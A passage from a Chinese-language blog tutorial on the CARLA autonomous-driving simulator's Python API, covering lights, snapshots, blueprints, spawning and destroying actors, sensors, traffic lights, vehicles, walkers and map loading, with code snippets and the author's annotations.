world.get_lightmanager()</span><br><span class="line">mylights = lmanager.get_all_lights()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom a specific light</span></span><br><span class="line">light01 = mylights[<span class="number">0</span>]</span><br><span class="line">light01.turn_on()</span><br><span class="line">light01.set_intensity(<span class="number">100.0</span>)</span><br><span class="line">state01 = carla.LightState(<span class="number">200.0</span>,red,carla.LightGroup.Building,<span class="literal">True</span>)</span><br><span class="line">light01.set_light_state(state01)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom a group of lights</span></span><br><span class="line">my_lights = lmanager.get_light_group(carla.LightGroup.Building)</span><br><span class="line">lmanager.turn_on(my_lights)</span><br><span class="line">lmanager.set_color(my_lights,carla.Color(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">lmanager.set_intensities(my_lights,list_of_intensities)</span><br></pre></td></tr></table></figure><ul><li>车灯必须由用户打开&#x2F;关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 到目前为止，并非所有车辆都集成了灯光。 以下是撰写本文时可用的列表。<br>  自行车：它们都有一个前后位置灯。<br>  摩托车： 雅马哈和哈雷戴维森车型。<br>  汽车：奥迪TT、雪佛兰、道奇（警车）、Etron、林肯、野马、特斯拉3S、大众T2以及来到CARLA的新模组。</li></ul><p>可以使用 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 方法随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Turn on position lights</span></span><br><span class="line">current_lights = carla.VehicleLightState.NONE</span><br><span class="line">current_lights |= carla.VehicleLightState.Position</span><br><span class="line">vehicle.set_light_state(current_lights)</span><br></pre></td></tr></table></figure><p>也可以使用天气部分中描述的 environment.py 实时设置灯光。</p><h4 id="2-2-5-调试"><a href="#2-2-5-调试" class="headerlink" title="2.2.5 调试"></a>2.2.5 调试</h4><p>世界对象有一个 carla.DebugHelper 对象作为公共属性。 它允许在模拟过程中绘制不同的形状。 这些用于跟踪正在发生的事件。 以下示例将在演员的位置和旋转处绘制一个红色框。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debug = world.debug</span><br><span class="line">debug.draw_box(carla.BoundingBox(actor_snapshot.get_transform().location,carla.Vector3D(<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">2</span>)),actor_snapshot.get_transform().rotation, <span class="number">0.05</span>, carla.Color(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此示例在 carla.DebugHelper 中的一个片段中进行了扩展，该片段显示了如何为世界快照中的每个角色绘制框。</p><h4 id="2-2-6-快照"><a href="#2-2-6-快照" class="headerlink" title="2.2.6 快照"></a>2.2.6 快照</h4><p>包含模拟中每个角色在单个帧中的状态。 一种带有时间参考的世界静止图像。 信息来自相同的模拟步骤，即使在异步模式下也是如此。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Retrieve a snapshot of the world at current frame.</span></span><br><span class="line">world_snapshot = world.get_snapshot()</span><br></pre></td></tr></table></figure><p>carla.WorldSnapshot 包含 carla.Timestamp 和 carla.ActorSnapshot 列表。 可以使用演员的 ID 搜索演员快照。 快照列出了其中出现的演员的 ID。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timestamp = world_snapshot.timestamp <span class="comment"># Get the time reference </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> actor_snapshot <span class="keyword">in</span> world_snapshot: <span class="comment"># Get the actor and the snapshot information</span></span><br><span class="line">    actual_actor = world.get_actor(actor_snapshot.<span class="built_in">id</span>)</span><br><span class="line">    actor_snapshot.get_transform()</span><br><span class="line">    actor_snapshot.get_velocity()</span><br><span class="line">    actor_snapshot.get_angular_velocity()</span><br><span class="line">    actor_snapshot.get_acceleration()  </span><br><span class="line"></span><br><span class="line">actor_snapshot = world_snapshot.find(actual_actor.<span class="built_in">id</span>) <span class="comment"># Get an actor&#x27;s snapshot</span></span><br></pre></td></tr></table></figure><h4 id="2-2-7-世界设置"><a href="#2-2-7-世界设置" class="headerlink" title="2.2.7 世界设置"></a>2.2.7 世界设置</h4><p>世界可以访问一些用于模拟的高级配置。 这些决定了渲染条件、模拟时间步长以及客户端和服务器之间的同步。 它们可以从助手类 carla.WorldSettings 中访问。</p><p>目前，默认的 CARLA 以最佳图形质量、可变时间步长和异步运行。 要进一步了解此问题，请查看“高级步骤”部分。 有关同步和时间步长以及渲染选项的页面可能是一个很好的起点。</p><h3 id="2-3-蓝图"><a href="#2-3-蓝图" class="headerlink" title="2.3 蓝图"></a>2.3 蓝图</h3><p>CARLA 中的 Actor 是在模拟中执行动作的元素，它们可以影响其他 Actor。 CARLA 中的参与者包括车辆和步行者，还包括传感器、交通标志、交通灯和观众。 对如何操作它们有充分的了解是至关重要的。</p><p>本节将介绍生成、销毁、类型以及如何管理它们。 </p><h4 id="2-3-1-蓝图"><a href="#2-3-1-蓝图" class="headerlink" title="2.3.1 蓝图"></a>2.3.1 蓝图</h4><p>这些布局允许用户将新演员顺利融入模拟。 它们是带有动画和一系列属性的已制作模型。 其中一些是可修改的，而另一些则不是。 这些属性包括车辆颜色、激光雷达传感器中的通道数量、步行者的速度等等。</p><p>可用的蓝图及其属性列在蓝图库中。 车辆和步行者蓝图有一个世代属性，指示它们是新的（第 2 代）还是旧的（第 1 代）资产。</p><h4 id="2-3-2管理蓝图库"><a href="#2-3-2管理蓝图库" class="headerlink" title="2.3.2管理蓝图库"></a>2.3.2管理蓝图库</h4><p>carla.BlueprintLibrary 类包含一个 carla.ActorBlueprint 元素列表。 世界对象可以提供对它的访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blueprint_library = world.get_blueprint_library()</span><br></pre></td></tr></table></figure><p>蓝图有一个 ID 来识别它们以及由此产生的演员。 可以读取该库以查找特定 ID、随机选择蓝图或使用通配符模式过滤结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find a specific blueprint.</span></span><br><span class="line">collision_sensor_bp = blueprint_library.find(<span class="string">&#x27;sensor.other.collision&#x27;</span>)</span><br><span class="line"><span class="comment"># Choose a vehicle blueprint at random.</span></span><br><span class="line">vehicle_bp = random.choice(blueprint_library.<span class="built_in">filter</span>(<span class="string">&#x27;vehicle.*.*&#x27;</span>))</span><br></pre></td></tr></table></figure><p>除此之外，每个 carla.ActorBlueprint 都有一系列 carla.ActorAttribute 可以获取和设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_bike = [vehicle.get_attribute(<span class="string">&#x27;number_of_wheels&#x27;</span>) == <span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span>(is_bike)</span><br><span class="line">    vehicle.set_attribute(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;255,0,0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：有些属性无法修改，请在蓝图库中查看</strong></p><p>属性有一个 carla.ActorAttributeType 变量。 它从枚举列表中声明其类型。 此外，可修改属性带有推荐值列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> blueprint:</span><br><span class="line">    <span class="keyword">if</span> attr.is_modifiable:</span><br><span class="line">        blueprint.set_attribute(attr.<span class="built_in">id</span>, random.choice(attr.recommended_values))</span><br></pre></td></tr></table></figure><p>用户可以创建自己的交通工具。查看教程(资产)来学习。贡献者可以将他们的新内容添加到 CARLA。</p><h3 id="2-4-演员的生命周期"><a href="#2-4-演员的生命周期" class="headerlink" title="2.4 演员的生命周期"></a>2.4 演员的生命周期</h3><p>本节提到了关于参与者的不同方法。PythonAPI 提供了在一个框架中应用最常见的批处理命令的命令。</p><h4 id="2-4-1-生成"><a href="#2-4-1-生成" class="headerlink" title="2.4.1 生成"></a>2.4.1 生成</h4><p>世界对象负责生成actors并跟踪它们。 生成只需要一个蓝图和一个 carla.Transform 来说明 Actor 的位置和旋转。</p><p>这个世界有两种不同的方法来产生Actor。</p><ul><li>spawn_actor() 生成失败会报错</li><li>try_spawn_actor() 生成失败返回none</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transform = Transform(Location(x=<span class="number">230</span>, y=<span class="number">195</span>, z=<span class="number">40</span>), Rotation(yaw=<span class="number">180</span>))</span><br><span class="line">actor = world.spawn_actor(blueprint, transform)</span><br></pre></td></tr></table></figure><p><strong>注意：CARLA 使用虚拟引擎坐标系统。记住 carla.Rotation()构造函数定义为(俯仰，偏航，滚动) ，它不同于一般的虚拟引擎编辑器(滚动，俯仰，偏航)。xyz坐标的单位是m</strong></p><p>这里的俯仰，偏航，滚动事实上是pitch, yaw, roll，在笛卡尔坐标系中，pitch是围绕X轴旋转，也叫做俯仰角，yaw是围绕Y轴旋转，也叫偏航角，roll是围绕Z轴旋转，也叫翻滚角。如下图所示</p><p><img src="/.io//20140401183456562.jpg" alt="20140401183456562"></p><p>如果在指定位置发生碰撞，actor 将不会生成。 无论这发生在静态对象还是其他Actor身上。 可以尝试避免这些不希望的生成碰撞。</p><ul><li>map.get_spawn_points() 用于车辆。 返回推荐的生成点列表。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn_points = world.get_map().get_spawn_points()</span><br></pre></td></tr></table></figure><ul><li>world.get_random_location() 用于行人。 返回人行道上的随机点。 同样的方法用于为步行者设置目标位置。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawn_point = carla.Transform()</span><br><span class="line">spawn_point.location = world.get_random_location_from_navigation()</span><br></pre></td></tr></table></figure><p>一个actor在生成时可以附加到另一个actor上。 演员跟随他们所依附的父类。 这对传感器特别有用。 附件可以是刚性的（适合检索精确数据），也可以根据其父项轻松移动。附加类型由carla.AttachmentType 定义。</p><p><strong>注意：当产生附加到另一个actor上的actor时，提供的transformer必须相对于父actor。</strong></p><p>下一个示例将摄像头固定在车辆上，因此它们的相对位置保持固定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Attach Actor</span></span><br><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(camera_bp)</span><br><span class="line">relative_transform = carla.Transform(carla.Location(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>),carla.Rotation())</span><br><span class="line">camera = world.spawn_actor(camera_bp, relative_transform, actor, carla.AttachmentType.Rigid)</span><br></pre></td></tr></table></figure><p>生成后，世界对象会将演员添加到列表中。 这可以很容易地搜索或迭代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">actor_list = world.get_actors()</span><br><span class="line"><span class="comment"># Find an actor by id.</span></span><br><span class="line">actor = actor_list.find(<span class="built_in">id</span>)</span><br><span class="line"><span class="comment"># Print the location of all the speed limit signs in the world.</span></span><br><span class="line"><span class="keyword">for</span> speed_sign <span class="keyword">in</span> actor_list.<span class="built_in">filter</span>(<span class="string">&#x27;traffic.speed_limit.*&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(speed_sign.get_location())</span><br></pre></td></tr></table></figure><p>上面的都是CARLA官方文档给我们写好的。实际上只有几个是常用的。如果我们想生成一个Actor, 必须要先定义它的蓝图（Blueprint），这就好比造房子前要先绘制设计图一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到这个世界所有物体的蓝图</span></span><br><span class="line">blueprint_library = world.get_blueprint_library()</span><br><span class="line"><span class="comment"># 从浩瀚如海的蓝图中找到奔驰的蓝图</span></span><br><span class="line">ego_vehicle_bp = blueprint_library.find(<span class="string">&#x27;vehicle.mercedes-benz.coupe&#x27;</span>)</span><br><span class="line"><span class="comment"># 给我们的车加上特定的颜色</span></span><br><span class="line">ego_vehicle_bp.set_attribute(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;0, 0, 0&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有可以作为初始点的位置并随机选择一个</span></span><br><span class="line">transform = random.choice(world.get_map().get_spawn_points())</span><br><span class="line"><span class="built_in">print</span>(transform)</span><br><span class="line"><span class="comment"># 在这个位置生成汽车</span></span><br><span class="line">ego_vehicle = world.spawn_actor(ego_vehicle_bp, transform)</span><br></pre></td></tr></table></figure><h4 id="2-4-2管理"><a href="#2-4-2管理" class="headerlink" title="2.4.2管理"></a>2.4.2管理</h4><p>carla.Actor 主要由 get() 和 set() 方法组成，用于管理地图周围的演员。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Handle Actor</span></span><br><span class="line"><span class="built_in">print</span>(actor.get_acceleration())</span><br><span class="line"><span class="built_in">print</span>(actor.get_velocity())</span><br><span class="line"></span><br><span class="line">location = actor.get_location()</span><br><span class="line">location.z += <span class="number">10.0</span></span><br><span class="line">actor.set_location(location)</span><br></pre></td></tr></table></figure><p>可以禁用 actor 的物理，将其冻结在某位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">actor.set_simulate_physics(<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(actor.get_location())</span><br></pre></td></tr></table></figure><p>除此之外，actor还有他们的蓝图提供的标签，这些标签主要用于语义分割传感器。</p><p><strong>注意：大多数方法异步地向模拟器发送请求。模拟器在每次更新时解析它们的时间是有限的。用 set ()方法充斥模拟器将会积累一个显著的延迟。</strong></p><h4 id="2-4-3销毁"><a href="#2-4-3销毁" class="headerlink" title="2.4.3销毁"></a>2.4.3销毁</h4><p>当 Python 脚本完成时，Actor 不会被销毁，需要明确地手动销毁他们。销毁会阻塞仿真，直到完成。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destroyed_sucessfully = actor.destroy() <span class="comment"># Returns True if successful</span></span><br></pre></td></tr></table></figure><h3 id="2-5Actor类型"><a href="#2-5Actor类型" class="headerlink" title="2.5Actor类型"></a>2.5Actor类型</h3><h4 id="2-5-1-传感器"><a href="#2-5-1-传感器" class="headerlink" title="2.5.1 传感器"></a>2.5.1 传感器</h4><p>传感器是产生数据流的actor。在官方文档的第四部分和本文档接下来的部分会单独介绍。现在，让我们看看一个常见的传感器产生周期。此示例生成一个摄像机传感器，将其连接到车辆上，并告诉摄像机将生成的图像保存到磁盘。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">camera = world.spawn_actor(camera_bp, relative_transform, attach_to=my_vehicle)</span><br><span class="line">camera.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;output/%06d.png&#x27;</span> % image.frame))</span><br></pre></td></tr></table></figure><ul><li>传感器也有蓝图，可以设置属性</li><li>大多数传感器将连接到车辆，收集有关其周围环境的信息</li><li>传感器监听数据。接收到数据后，他们调用 Lambda表达式 描述的函数</li></ul><p>只设置了以上的回调，并不会保存传感器数据，需要调用 world.tick() 获取传感器数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Tick the server</span></span><br><span class="line">    world.tick()</span><br><span class="line">    w_frame = world.get_snapshot().frame</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;World&#x27;s frame: %d&quot;</span> % w_frame)</span><br></pre></td></tr></table></figure><p>运行脚本的控制台打印世界的当前帧数，rgb 图像会保存在磁盘里。默认情况下 sensor.camera.rgb 产生的图像分辨率是 800 x 600，这个可以设定。</p><h4 id="2-5-2-旁观者"><a href="#2-5-2-旁观者" class="headerlink" title="2.5.2 旁观者"></a>2.5.2 旁观者</h4><p>由虚幻引擎放置以提供游戏内视角。 它可以用来移动模拟器窗口的视图。 以下示例将移动旁观者演员，以将视线指向所需的车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spectator = world.get_spectator()</span><br><span class="line">transform = vehicle.get_transform()</span><br><span class="line">spectator.set_transform(carla.Transform(transform.location + carla.Location(z=<span class="number">50</span>),</span><br><span class="line">carla.Rotation(pitch=-<span class="number">90</span>)))</span><br></pre></td></tr></table></figure><h4 id="2-5-3-交通标志和交通灯"><a href="#2-5-3-交通标志和交通灯" class="headerlink" title="2.5.3 交通标志和交通灯"></a>2.5.3 交通标志和交通灯</h4><p>到目前为止，在 CARLA 中，只有停止点、生成和红绿灯被认为是演员。 其余的 OpenDRIVE 标志可从 API 作为 carla.Landmark 访问。 使用这些实例可以访问它们的信息，但它们在模拟中不作为参与者存在。 在下方的“地图和导航”有对地标更详细的解释。</p><p>当模拟开始时，使用 OpenDRIVE 文件中的信息自动生成停止、生成和交通灯。这些都不能在蓝图库中找到，因此不能产生。</p><p>CARLA 地图在 OpenDRIVE 文件中没有交通标志和灯光，这些都是由开发人员手动放置的。</p><p>道路图本身并没有界定交通标志。相反，他们有一个 carla.BoundingBox边界框影响其中的车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Get the traffic light affecting a vehicle</span></span><br><span class="line"><span class="keyword">if</span> vehicle_actor.is_at_traffic_light():</span><br><span class="line">    traffic_light = vehicle_actor.get_traffic_light()</span><br></pre></td></tr></table></figure><p>交通信号灯出现在路口。 与任何actor一样，他们有自己的唯一 ID，但也有交汇点的组 ID。 为了识别同一组中的交通灯，使用了杆 ID。</p><p>同一组中的红绿灯遵循一个循环。 第一个设置为绿色，而其余的则保持为红色。 活跃的在绿色、黄色和红色上花费几秒钟，所以有一段时间所有的灯都是红色的。 然后，下一个红绿灯开始循环，前一个红绿灯与其他红绿灯一起冻结。</p><p>可以使用 API 设置交通灯的状态。 在每个状态上花费的秒数也是如此。 carla.TrafficLightState 将可能的状态描述为一系列枚举值。</p><p>交通信号灯的状态可以通过 API 设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set traffic light state</span></span><br><span class="line">traffic_light = vehicle.get_traffic_light()</span><br><span class="line"><span class="built_in">print</span>(traffic_light)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change a red traffic light to green （未验证，因为找不到 traffic_light）</span></span><br><span class="line"><span class="keyword">if</span> traffic_light.get_state() == carla.TrafficLightState.Red:</span><br><span class="line">    traffic_light.set_state(carla.TrafficLightState.Green)</span><br><span class="line">    traffic_light.set_set_green_time(<span class="number">4.0</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：只有当红灯亮时，车辆才会注意到红灯。</strong></p><h4 id="2-5-4-车辆"><a href="#2-5-4-车辆" class="headerlink" title="2.5.4 车辆"></a>2.5.4 车辆</h4><p>carla.Vehicle 是一种特殊类型的演员。 它包含模拟轮式车辆物理特性的特殊内部组件。 这是通过应用四种不同的控件来实现的：</p><ul><li>carla.VehicleControl 为油门、转向、刹车等驾驶命令提供输入。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=-<span class="number">1.0</span>))</span><br></pre></td></tr></table></figure><ul><li>carla.VehiclePhysicsControl 定义了车辆的物理属性并包含另外两个控制器：</li><li>carla.GearPhysicsControl 控制齿轮。</li><li>carla.WheelPhysicsControl 提供对每个车轮的特定控制。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.apply_physics_control(carla.VehiclePhysicsControl(max_rpm = <span class="number">5000.0</span>, center_of_mass = carla.Vector3D(<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>), torque_curve=[[<span class="number">0</span>,<span class="number">400</span>],[<span class="number">5000</span>,<span class="number">400</span>]]))</span><br></pre></td></tr></table></figure><p>车辆有一个碰撞体积 carla.BoundingBox 。 此边界框允许将物理应用到车辆并检测碰撞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">box = vehicle.bounding_box</span><br><span class="line"><span class="built_in">print</span>(box.location)         <span class="comment"># Location relative to the vehicle.</span></span><br><span class="line"><span class="built_in">print</span>(box.extent)           <span class="comment"># XYZ half-box extents in meters.</span></span><br></pre></td></tr></table></figure><p>通过启用扫描轮碰撞参数可以<strong>改善车轮的物理特性</strong>。 默认的车轮物理场对每个车轮使用从轴到地板的单射线投射，但是当启用扫描车轮碰撞时，会检查车轮的整个体积以防止碰撞。 它可以这样启用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">physics_control = vehicle.get_physics_control()</span><br><span class="line">physics_control.use_sweep_wheel_collision = <span class="literal">True</span></span><br><span class="line">vehicle.apply_physics_control(physics_control)</span><br></pre></td></tr></table></figure><p>车辆包括其他独有的功能：</p><ul><li>自动驾驶模式将为车辆订阅交通管理器以模拟真实的城市状况。 这个模块是硬编码的，不是基于机器学习的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vehicle.set_autopilot(<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>车灯必须由用户打开和关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 并非所有车辆都集成了照明灯。 在撰写本文时，集成车灯的车辆如下：<br>  自行车：所有自行车都有前后位置灯。<br>  摩托车：雅马哈和哈雷戴维森车型。<br>  汽车：奥迪 TT、雪佛兰 Impala、道奇警车、道奇 Charger、奥迪 e-tron、林肯 2017 和 2020、野马、特斯拉 Model 3、特斯拉 Cybertruck、大众 T2 和梅赛德斯 C 级。</li></ul><p>可以使用方法 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Turn on position lights</span></span><br><span class="line">current_lights = carla.VehicleLightState.NONE</span><br><span class="line">current_lights |= carla.VehicleLightState.Position</span><br><span class="line">vehicle.set_light_state(current_lights)</span><br></pre></td></tr></table></figure><p>根据部分博主的内容实验以及本机实验，二进制操作灯光并不稳定（在很多情况下失败），因此建议把上方的第一第二行代码改为current_lights &#x3D; carla.VehicleLightState.Position直接设置。</p><h4 id="2-5-5行人"><a href="#2-5-5行人" class="headerlink" title="2.5.5行人"></a>2.5.5行人</h4><p>carla.Walker 的工作方式与车辆类似。 对它们的控制由controllers提供。</p><ul><li>carla.WalkerControl 以一定的方向和速度移动行人。 它还允许他们跳跃。</li><li>carla.WalkerBoneControl 提供对 3D 骨架的控制。</li></ul><p>步行者可以由 AI controller 控制。 他们没有自动驾驶模式。 carla.WalkerAIController Actor 围绕它所连接的 Actor 移动。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">walker_controller_bp = world.get_blueprint_library().find(<span class="string">&#x27;controller.ai.walker&#x27;</span>)</span><br><span class="line">world.SpawnActor(walker_controller_bp, carla.Transform(), parent_walker)</span><br></pre></td></tr></table></figure><p>每个 AI controller都需要初始化、目标和速度（可选）。 停止控制器的工作方式相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ai_controller.start()</span><br><span class="line">ai_controller.go_to_location(world.get_random_location_from_navigation())</span><br><span class="line">ai_controller.set_max_speed(<span class="number">1</span> + random.random())  <span class="comment"># Between 1 and 2 m/s (default is 1.4 m/s).</span></span><br><span class="line">...</span><br><span class="line">ai_controller.stop()</span><br></pre></td></tr></table></figure><p>注意：AI controller是没有身体的，没有物理。它不会出现在现场。而且，相对于其父节点的位置(0,0,0)不会引起冲突。</p><p>当行人到达目标位置时，他们会自动步行到另一个随机点。 如果无法到达目标点，步行者将前往离他们当前位置最近的点。</p><p><strong>注意：如果要删除AI行人，需要停止AI controller，并且清除所有的actor和controller。</strong></p><p>carla.Client 中的一个片段使用批量生成大量步行者并让他们四处游荡。</p><h3 id="2-6-地图"><a href="#2-6-地图" class="headerlink" title="2.6 地图"></a>2.6 地图</h3><p>地图包括城镇的 3D 模型及其道路定义。 地图的道路定义基于 OpenDRIVE 文件，这是一种标准化、带注释的道路定义格式。 OpenDRIVE 标准 1.4 定义道路、车道、交叉口等的方式决定了 Python API 的功能以及决策背后的推理。</p><p>Python API 充当高级查询系统来导航这些道路。 它不断发展以提供更广泛的工具集。后面会单独提到python API</p><h4 id="2-6-1-改变地图"><a href="#2-6-1-改变地图" class="headerlink" title="2.6.1 改变地图"></a>2.6.1 改变地图</h4><p>要改变地图，世界也必须改变。 模拟将从头开始重新创建。 您可以在新世界中使用同一张地图重新开始，也可以同时更改地图和世界：</p><ul><li>reload_world() 在同一张地图里创建一个新的实例</li><li>load_world() 改变当前地图，并创建一个新的世界</li></ul><p>每张地图都有一个与当前加载的城市名称相匹配的<code>name</code>属性，例如 <em>Town01</em>，可以用client.get_available_maps()来获取可用地图列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载地图</span></span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01&#x27;</span>)</span><br><span class="line"><span class="comment"># world = client.reload_world()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取可用地图列表</span></span><br><span class="line"><span class="built_in">print</span>(client.get_available_maps())</span><br></pre></td></tr></table></figure><h4 id="2-6-2-地标"><a href="#2-6-2-地标" class="headerlink" title="2.6.2 地标"></a>2.6.2 地标</h4><p>OpenDRIVE 种定义的交通标志将转换为 CARLA 的 landmark 对象，使用 API 查询：</p><ul><li>carla.Landmark 对象代表 OpenDRIVE 信号。 此类的属性和方法描述了地标及其影响范围。</li><li>carla.LandmarkOrientation 说明地标相对于道路几何定义的方向。</li><li>carla.LandmarkType 包含常见的地标类型，以便于转换为 OpenDRIVE 类型。</li><li>carla.Waypoint 可以获得位于其前方一定距离的地标。 可以指定要获取的地标类型。</li><li>carla.Map 检索地标集。 它可以返回地图中的所有地标，或者具有共同 ID、类型或组的地标。</li><li>carla.World 充当地标与在模拟中代表它们的 carla.TrafficSign 和 carla.TrafficLight 之间的中介。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取地标</span></span><br><span 